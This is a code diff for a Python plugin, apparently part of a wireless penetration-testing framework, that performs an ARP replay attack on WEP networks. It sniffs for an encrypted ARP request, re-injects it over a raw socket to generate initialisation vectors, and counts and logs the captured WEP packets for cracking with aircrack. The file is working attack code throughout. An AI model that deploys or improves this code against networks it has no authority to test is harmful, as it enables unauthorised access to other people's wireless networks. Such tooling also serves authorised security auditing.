@@ -4,13 +4,13 @@ This plugin will launch a full arp replay attack on a WEP network
 You can then check the wep data log and launch aircrack on it.
 """
 import os, traceback, time
-from plugin import AirScannerPlugin, AirInjectorPlugin
-from scapy.all import sniff, sendp, Dot11, Dot11WEP, conf, rdpcap
+from plugin import AirScannerPlugin
+from scapy.all import sniff, Dot11, Dot11WEP, conf, rdpcap
 from subprocess import Popen
 from threading import Thread, Lock
 from utils.utils import DEVNULL
 
-class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
+class ARPReplayer(AirScannerPlugin):
 
 	def __init__(self):
 		super(ARPReplayer, self).__init__("arpreplayer")
@@ -50,7 +50,6 @@ class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
 		if Dot11WEP in packet:
 			# Check for ARP packet if not found before
 			if self.arp_packet is None:
-				packet[Dot11].show
 				# Identify if ARP packet by length and destination and if they are broadcast.
 				if 	len(packet[Dot11WEP].wepdata) == 36 and 		\
 					packet[Dot11].addr1 == self.target_bssid and	\
@@ -60,7 +59,7 @@ class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
 					self.injection_working = True
 					self.replay_thread = Thread( target = self.arp_replay )
 					self.replay_thread.start()
-					print "Found a ARP request packet, trying replay attack."
+					print "[+] Found a ARP request packet, trying replay attack."
 
 			# Log WEP Data packets...
 			if 	"iv" in packet[Dot11WEP].fields.keys():
@@ -69,9 +68,14 @@ class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
 
 				if 	self.n_captured_data_packets % self.notification_divisor == 0 and \
 					self.n_captured_data_packets > 0:
-					n_packets = len(rdpcap(self.destination_folder + self.filename))
-					self.n_captured_data_packets = n_packets
-					print "Scapy captured {} wep data packets so far...".format(n_packets)
+					wep_packets = rdpcap(self.destination_folder + self.filename)
+					ivs = 0
+					for p in wep_packets:
+						if Dot11WEP in p:
+							if p.iv != None and p.iv != '':
+								ivs += 1
+					self.n_captured_data_packets = ivs
+					print "[+] tcpdump captured {} wep data packets so far...".format(ivs)
 
 			# Evaluate if injection is working
 			if self.injection_working:
@@ -80,17 +84,16 @@ class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
 
 					self.injection_working = False
 					self.n_arp_packets_sent = 0
-					print "ARP replay was not working. Looking for new ARP packet."
+					print "[-] ARP replay was not working. Looking for new ARP packet."
 					self.replay_thread.join()
 
 
 	def arp_replay(self):
 		if self.arp_packet is None:
-			print "No ARP packet to try replay attack."
+			print "[-] No ARP packet to try replay attack."
 			return
 
-		# Sppeds up scapy packet sending which is very slow.
-		s = conf.L2socket(iface=self.sniffing_interface)
+		s = conf.L2socket(iface = self.sniffing_interface)
 		self.injection_running = True
 		while self.injection_working:
 			try:
@@ -98,7 +101,7 @@ class ARPReplayer(AirScannerPlugin, AirInjectorPlugin):
 				self.n_arp_packets_sent += 1
 			except: pass # No buffer space available.. skip and keep sending
 
-		print "Stopped replay attack from last ARP packet."
+		print "[+] Stopped replay attack from last ARP packet."
 		self.injection_running = False
 		self.arp_packet = None
 		self.n_arp_packets_sent = 0
